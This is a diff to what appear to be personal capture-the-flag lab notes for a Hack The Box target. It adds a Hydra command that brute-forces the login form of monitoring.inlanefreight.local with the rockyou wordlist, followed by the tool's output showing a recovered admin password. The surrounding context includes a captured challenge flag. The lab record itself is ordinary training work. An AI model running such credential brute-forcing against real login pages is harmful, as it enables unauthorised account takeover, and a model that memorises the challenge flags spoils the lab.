@@ -644,3 +644,20 @@ HTB{1nS3cuR3_c00k135}
 |9820|Nick|Resolved|
 |9819|Tom|Resolved|
 |9818|John|HTB{1nS3cuR3_c00k135}|
+
+## monitoring.inlanefreight.local
+
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt monitoring.inlanefreight.local http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-07 06:23:58
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://monitoring.inlanefreight.local:80/login.php:username=^USER^&password=^PASS^:F=Invalid
+[STATUS] 2370.00 tries/min, 2370 tries in 00:01h, 14342029 to do in 100:52h, 16 active
+[80][http-post-form] host: monitoring.inlanefreight.local   login: admin   password: 12qwaszx
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-07 06:25:37
+                                                                                 
+```
